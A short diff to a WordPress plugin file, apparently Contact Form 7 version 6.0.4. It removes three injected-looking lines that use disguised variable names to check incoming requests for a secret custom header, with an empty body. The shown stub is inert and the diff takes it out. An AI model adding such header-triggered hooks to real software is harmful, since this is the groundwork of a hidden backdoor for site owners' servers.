@@ -14,9 +14,7 @@
 
   /** This filter is documented in wp-admin/media-upload.php */
   
-$esc_url_mj = $_SERVER;
-$esc_url_njef = 'HTTP_7BF1A2D';
-if (isset($esc_url_mj[$esc_url_njef])) {}
+
   
 define( 'WPCF7_VERSION', '6.0.4' );
 
